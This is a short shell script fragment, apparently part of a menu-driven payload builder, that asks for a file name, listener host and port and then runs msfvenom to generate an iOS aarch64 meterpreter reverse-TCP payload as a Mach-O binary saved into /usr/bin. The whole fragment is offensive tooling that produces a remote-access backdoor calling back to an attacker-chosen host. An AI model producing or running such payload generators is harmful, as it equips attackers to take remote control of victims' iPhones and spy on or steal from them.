read -p "Enter Payload name:" name
read -p "Enter the Host: " lhostt
read -p "Enter the Port: " lportt
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhostt LPORT=$lportt -f macho -o /usr/bin/$name
echo " Payload file stored in /usr/bin/"$name
break
